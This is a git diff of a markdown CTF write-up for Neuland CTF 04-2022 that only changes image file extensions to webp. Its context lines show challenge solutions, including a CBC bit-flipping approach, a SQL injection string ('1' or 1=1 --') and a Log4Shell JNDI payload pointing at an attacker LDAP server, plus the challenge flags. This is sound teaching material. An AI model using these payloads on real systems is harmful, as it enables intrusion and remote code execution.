@@ -167,7 +167,7 @@ def createAuth(s):
 
 Since the code only filters for **root&password=password123'** and AES is a Blockcipher, we can try to trick the Server into generating us the correct hash. The first block (i.e. the first 16 bytes) of this ciphertext is the ciphertext of username=, the ciphertext of this block is also the IV for our second block (CBC Mode). In decryption mode the IV is XORed with the result of the decryption function, we can thus modify bits in the second block by flipping the corresponding bit in the IV.
 
-![](../../src/blog/images/neuland-ctf-04-2022/flipdot.png)
+![](../../src/blog/images/neuland-ctf-04-2022/flipdot.webp)
 </br>
 
 **Python script:**
@@ -320,10 +320,10 @@ nland{mu171_f4c702_3nc0d1n9}
 *The quieter you become, the more you are able to see.*
 </br>
 
-![](../../src/blog/images/neuland-ctf-04-2022/blindspot.jpg)
+![](../../src/blog/images/neuland-ctf-04-2022/blindspot.webp)
 </br>
 
-Some dots seem to have a thinner rim and look like braille. If we translate them, it spells **agruizlke**. After taking a closer look at the picture itself, it seems to contain something. We can try to extract it with [Steghide](http://steghide.sourceforge.net/) ```steghide extract -sf blindspot.jpg``` . The extracted text file contains the flag.
+Some dots seem to have a thinner rim and look like braille. If we translate them, it spells **agruizlke**. After taking a closer look at the picture itself, it seems to contain something. We can try to extract it with [Steghide](http://steghide.sourceforge.net/) ```steghide extract -sf blindspot.webp``` . The extracted text file contains the flag.
 ```
 nland{72y_h42d32}
 ```
@@ -335,7 +335,7 @@ nland{72y_h42d32}
 *Maybe it would have been easier to put my secret into pastebin.*
 </br>
 
-![](../../src/blog/images/neuland-ctf-04-2022/pillowtalk.png)
+![](../../src/blog/images/neuland-ctf-04-2022/pillowtalk.webp)
 
 In the upper left corner of the picture, we can see a faint red line. When we open the image and look at the individual pixels in the Python library PIL, we can see that the red line consists of ((200,50,50,50) and (200,50,51,50)).
 
@@ -344,7 +344,7 @@ We can parse out the 1 and 0 with a simple Python script.
 from PIL import Image
 import matplotlib.pyplot as plt
 
-im = Image.open('pillowtalk.png')
+im = Image.open('pillowtalk.webp')
 pixelMap = im.load()
 
 img = Image.new( im.mode, im.size)
@@ -459,7 +459,7 @@ The flag is ```nland{m08113ph0n3}```.
 
 *Your buddy Masahiro sent you a flag.*
 
-![](../../src/blog/images/neuland-ctf-04-2022/output-6.png)
+![](../../src/blog/images/neuland-ctf-04-2022/output-6.webp)
 </br>
 
 For this challenge you received a challenge text and a PNG-file. The image 
@@ -470,9 +470,9 @@ beeing the zeroth one.
 
 The first step is therefor to run our preferred EXIF dumping tool on the file:
 ```bash
- % exiftool output-6.png
+ % exiftool output-6.webp
 ExifTool Version Number         : 12.16
-File Name                       : output-6.png
+File Name                       : output-6.webp
 Directory                       : .
 File Size                       : 4.6 KiB
 File Modification Date/Time     : 2021:11:22 20:46:43+01:00
@@ -512,9 +512,9 @@ Still, we need more information. This is a forensics challenge, after all.
 Let's try our usual arsenal - file, strings, binwalk!
 
 ```bash
-% file output-6.png
-output-6.png: PNG image data, 600 x 400, 4-bit colormap, non-interlaced
-% strings output-6.png
+% file output-6.webp
+output-6.webp: PNG image data, 600 x 400, 4-bit colormap, non-interlaced
+% strings output-6.webp
 IHDR
 tEXtComment
 We're no strangers to Exif
@@ -530,7 +530,7 @@ F*U.V*^>
 +N,;n
 IEND
 No, seriously. This ain't no stego challenge! (Hint 2)
-% binwalk output-6.png
+% binwalk output-6.webp
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
 0             0x0             PNG image, 600 x 400, 4-bit colormap, non-interlaced
@@ -581,12 +581,12 @@ Now comes to most tricky part. You need to recognize that the color palette of
 the image contains every color twice. Any capable graphic program (GIMP or 
 Photoshop both work fine) can show you the color palette:
 
-![](../../src/blog/images/neuland-ctf-04-2022/fun_with_flags_1.png)
+![](../../src/blog/images/neuland-ctf-04-2022/fun_with_flags_1.webp)
 </br>
 
 We fiddle around a bit with he colors and suddenly a wild QR code appears:
 
-![](../../src/blog/images/neuland-ctf-04-2022/fun_with_flags_2.png)
+![](../../src/blog/images/neuland-ctf-04-2022/fun_with_flags_2.webp)
 </br>
 
 Almost there. The challenge has got one last trick up its sleeve. The QR code
@@ -599,13 +599,13 @@ We can now either implement QR codes by ourselves (which is a lot of work honest
 or use a debugger tool such as the [QRazyBox](https://merricx.github.io/qrazybox/). We load up the image, open the 
 tool drawer and select the Format Info Bruteforcing tool.
 
-![](../../src/blog/images/neuland-ctf-04-2022/fun_with_flags_3.png)
+![](../../src/blog/images/neuland-ctf-04-2022/fun_with_flags_3.webp)
 </br>
 
 We hit the "Decode"-button and finally receive the well-earned flag. The 
 specified mask (Code 1) turned out to actually be mask 2.
 
-![](../../src/blog/images/neuland-ctf-04-2022/fun_with_flags_4.png)
+![](../../src/blog/images/neuland-ctf-04-2022/fun_with_flags_4.webp)
 
 </br>
 
@@ -620,7 +620,7 @@ specified mask (Code 1) turned out to actually be mask 2.
 
 The flag is hidden in the latest issue of the University Campus Life E-Mail newsletter with the title "Newsletter 02/Sommer '22". There is an entry advertising the Neuland CTF with the flag at the end.
 
-![](../../src/blog/images/neuland-ctf-04-2022/campus_life.jpeg)
+![](../../src/blog/images/neuland-ctf-04-2022/campus_life.webp)
 
 </br>
 
@@ -631,7 +631,7 @@ The flag is hidden in the latest issue of the University Campus Life E-Mail news
 
 We can find the flag taped to the window of the Neuland Office.
 
-![](../../src/blog/images/neuland-ctf-04-2022/office.jpeg)
+![](../../src/blog/images/neuland-ctf-04-2022/office.webp)
 
 </br>
 
@@ -642,7 +642,7 @@ We can find the flag taped to the window of the Neuland Office.
 
 A quick google search leads us to a [Twitter Account](https://twitter.com/0xc0c0c0c) with the mentioned name. When scrolling through the recent posts, we can find a picture of a desk setup. 
 
-![](../../src/blog/images/neuland-ctf-04-2022/setup.jpg)
+![](../../src/blog/images/neuland-ctf-04-2022/setup.webp)
 
 You can see a Post-it sticking to the screen with the flag written on it.
 
@@ -655,7 +655,7 @@ The flag is ```nland{0p324710n5_53cu217y}```.
 *Oh no, the hackerman stole our money :(*
 </br>
 
-![](../../src/blog/images/neuland-ctf-04-2022/IvanKalashnik.png)
+![](../../src/blog/images/neuland-ctf-04-2022/IvanKalashnik.webp)
 </br>
 
 For this challenge you received a challenge text and a PNG-file. The image 
@@ -695,7 +695,7 @@ The flag is ```nland{c4n7_h1d3_7h3_bl0ckz}```.
 There is a ESP32 BLE server called "Neuland Surveillance Device" in the room.
 You need to connect to it and read the only characteristic, which contains the flag.
 
-![](../../src/blog/images/neuland-ctf-04-2022/wireless.jpeg)
+![](../../src/blog/images/neuland-ctf-04-2022/wireless.webp)
 
 The flag is ```nland{d0n7-f0r637-70-fl055}```.
 
@@ -708,7 +708,7 @@ The flag is ```nland{d0n7-f0r637-70-fl055}```.
 
 We can find the flag by looking up the Certificate with https://crt.sh/. For **informatik.sexy** we find the entry **https://ctf-flag.informatik.sexy/** which holds the flag.
 
-![](../../src/blog/images/neuland-ctf-04-2022/certificate_transparency.png)
+![](../../src/blog/images/neuland-ctf-04-2022/certificate_transparency.webp)
 
 The flag is ```nland{7r4n5p4r3ncy-15-k3y} ```.
 
@@ -722,7 +722,7 @@ nland{<name of Simon's pet>_<last name of the on call employee>_<first name of t
 ```
 *Hint: The flag is written in all lowercase.*
 
-![](../../src/blog/images/neuland-ctf-04-2022/social_engineering.png)
+![](../../src/blog/images/neuland-ctf-04-2022/social_engineering.webp)
 </br>
 
 For the first part of the flag we need to take a look at the linked [Instagram of Simon Etsukos](https://www.instagram.com/simon.etsuko/) which includes a picture of his cat titled *Bodo*. 
@@ -745,7 +745,7 @@ The flag is ```nland{bodo_nagel_ada}```.
 *We need to get to our access code.*
 </br>
 
-![](../../src/blog/images/neuland-ctf-04-2022/super_secure_login.png)
+![](../../src/blog/images/neuland-ctf-04-2022/super_secure_login.webp)
 
 We can find the flag by inspecting the index.html file.
 
@@ -785,7 +785,7 @@ The flag is ```nland{fea7cf41-ad4c-4de6-952b-4e8085d08b00}```.
 *I lost my access codes. How can I get them back?*
 </br>
 
-![](../../src/blog/images/neuland-ctf-04-2022/super_secure_user_check.png)
+![](../../src/blog/images/neuland-ctf-04-2022/super_secure_user_check.webp)
 </br>
 
 We can solve the challenge with an always true injection **1' or 1=1 --**. The Query in the background should look something like this
@@ -971,7 +971,7 @@ ${jndi:ldap://myserver:1389/w9nmaj}
 
 Finally we just connect to the Minecraft server and drop the payload string in the chat. 
 
-![](../../src/blog/images/neuland-ctf-04-2022/minecraft.png)
+![](../../src/blog/images/neuland-ctf-04-2022/minecraft.webp)
 </br>
 
 The server will log all chat messages to the server log and as a result trigger the Log4Shell vulnerability.
